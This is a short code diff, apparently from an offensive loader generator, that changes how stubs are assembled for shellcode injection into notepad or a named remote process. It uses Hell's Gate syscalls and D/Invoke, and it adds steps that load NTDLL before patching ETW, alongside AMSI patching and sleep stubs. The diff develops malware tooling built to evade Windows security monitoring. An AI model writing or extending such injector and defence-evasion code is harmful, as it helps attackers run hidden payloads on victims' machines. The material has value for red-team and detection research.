@@ -738,7 +738,8 @@ if (hellsgate):
         if ("NtClose(" in stub) == false:
             stub.add(HellsgateNtCloseDelegate)
         if (processname == ""):
-            stub = stub & HellsgateNotepadProcIDStub
+            stub = stub & HellsgateNotepadProcIDStub & DInvokeGetModuleHandleADelegate
+            stub.add(SleepStubFirst)
             if (remoteETWpatch):
                 if ("NtProtectVirtualMemory(" in stub) == false:
                     stub.add(HellsgateProtectDelegate)
@@ -823,9 +824,12 @@ if (shellcode):
         stub = stub & LocalInjectDelegates & ShellcodelocalStub
     else:
         stub.add(RemoteProcImportStub)
+        stub.add(DInvokeGetModuleHandleADelegate)
         if (processname == ""):
             stub = stub & RemoteInjectDelegates & NotepadProcIDStub
+            stub.add(SleepStubFirst)
             if (remoteETWpatch):
+                stub.add(RemoteLoadNTDLLStub)
                 stub.add(RemotePatchETWStub)
             if (remoteAMSIpatch):
                 stub.add(RemoteLoadAMSIStub)
@@ -834,6 +838,7 @@ if (shellcode):
         else:
             stub = stub & RemoteInjectDelegates & ShellcoderemoteinjectStub_customprocfirst & ShellcoderemoteinjectStub_customprocseccond & ShellcoderemoteinjectStub_customprocID
             if (remoteETWpatch):
+                stub.add(RemoteLoadNTDLLStub)
                 stub.add(RemotePatchETWStub)
             if (remoteAMSIpatch):
                 stub.add(RemoteLoadAMSIStub)
